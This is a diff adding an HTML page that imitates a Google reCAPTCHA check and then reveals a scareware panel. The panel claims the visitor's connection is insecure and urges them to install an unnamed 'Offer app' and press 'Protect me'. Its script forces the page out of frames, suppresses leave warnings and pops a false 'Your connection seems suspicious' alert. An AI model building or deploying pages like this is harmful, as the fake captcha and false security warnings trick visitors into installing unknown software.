@@ -1,0 +1,91 @@
+<!DOCTYPE html><html lang="en"><head>
+  <base href="">
+<base href="">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="google" value="notranslate">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="css/style.css" rel="stylesheet" type="text/css">
+    <title>VPN is recommended!</title>
+</head>
+
+<body class="en ltr">
+<div class="main">
+    <div class="block">
+        <div class="title">
+            <div class="text-block">We want to make sure that you are not a robot:</div>
+        </div>
+        <div class="recaptcha w-clearfix">
+            <div class="content w-clearfix">
+                <div class="inline-block">
+                    <div class="checkbox"></div>
+                    <div class="load"></div>
+                </div>
+                <div class="inline-block2">
+                    <div class="text-block-3">I'm not a robot</div>
+                </div>
+            </div>
+            <div class="content-right">
+                <div class="rc-anchor-logo-portrait">
+                    <div class="rc-anchor-logo-img"></div>
+                    <div class="policy-text">reCAPTCHA</div>
+                    <div class="recaptcha-text">Privacy - Terms</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div style="opacity: 0;" class="block-final">
+        <div class="title-blue">
+            <div class="text-block-popunder">
+                <strong>VPN is recommended!</strong>
+                <br>Your connection may be not secure                <br>
+            </div>
+        </div>
+
+        <div class="content-popunder">
+            <div class="text-block-5">How to fix this</div>
+            <div class="text-block-6">
+                <strong>Step 1: </strong> Install the Offer app                <br>‍
+                <br>
+                <strong>Step 2: </strong> Launch the app, press "Protect me"            </div>
+        </div>
+
+        <div class="button-block w-clearfix">
+            <div class="left">
+                <img src="images/icons.jpg" width="110" alt="">
+            </div>
+            <div class="right w-clearfix">
+                <span class="button w-button">Install</span>
+            </div>
+        </div>
+    </div>
+    <a href="javascript:void(0)" id="pagelink"></a>
+    <div style="display:none;">
+        <a href="#">Go to site</a>
+    </div>
+</div>
+
+<script src="js/main.js"></script>
+<script type="text/javascript">
+    let clickURL = window.location.href;
+
+    if (top !== window) {
+        top.location.href = window.location.href;
+    }
+
+    function go_click(e) {
+        window.onbeforeunload = null;
+        top.location.href = clickURL;
+        e.preventDefault();
+        return false;
+    }
+
+    document.getElementById('pagelink').addEventListener('click', go_click);
+
+        setTimeout(function () {
+        alert("WARNING!\n\nYour connection seems suspicious.\nPlease enter the captcha below to confirm that you are not a robot.");
+    }, 100);
+    </script>
+
+
+</body></html>
